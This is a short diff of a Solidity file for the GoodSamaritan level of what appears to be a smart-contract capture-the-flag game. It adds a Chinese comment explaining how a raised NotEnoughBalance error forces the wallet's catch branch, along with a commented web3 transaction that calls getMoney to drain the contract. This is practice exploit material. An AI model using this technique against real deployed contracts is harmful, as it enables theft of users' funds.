@@ -17,4 +17,6 @@ contract GoodSamaritan {
     }
 }
 
-//web3.eth.sendTransaction({from:player, to:"0x4461D4e29d3639b50147dac9Be0BcC7d673Ca46B", data:web3.utils.sha3("getMoney(address)").slice(0,10)+"000000000000000000000000" + "CC03F3D117113EF43151A8467334C519546f63d6"})
+
+//该关卡首先coin中的isContract函数发送NotEnoughBalance，仅满足try wallet.donate10条件进入catch
+//web3.eth.sendTransaction({from:player, to:"0x4461D4e29d3639b50147dac9Be0BcC7d673Ca46B", data:web3.utils.sha3("getMoney(address)").slice(0,10)+"000000000000000000000000" + "041Ba64e09381e56a95dE0980B06b00dd314DbBF"})
